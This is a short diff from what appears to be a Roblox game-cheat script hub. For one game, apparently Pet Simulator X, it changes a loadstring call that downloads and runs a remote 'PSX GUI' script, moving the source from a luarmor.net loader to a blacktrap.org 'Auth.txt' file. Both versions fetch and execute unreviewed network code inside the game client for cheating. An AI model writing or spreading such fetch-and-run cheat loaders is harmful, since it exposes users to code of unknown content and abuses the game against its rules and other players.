@@ -169,7 +169,7 @@ elseif game.PlaceId == (6284583030) then
 	})
 	wait(5)
 	game:GetService("Chat"):Chat(game.Players.LocalPlayer.Character.Head , "Loading in PSX GUI" , Enum.ChatColor.White)
-	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a82cd5447cbbc4c7be0e8db405555787.lua"))()
+	loadstring(game:HttpGetAsync("https://blacktrap.org/blacktrap/users/checkpoint/Auth.txt"))()
 elseif game.PlaceId == (7991339063) then
 	wait(1.2)
 	game.StarterGui:SetCore("SendNotification", {
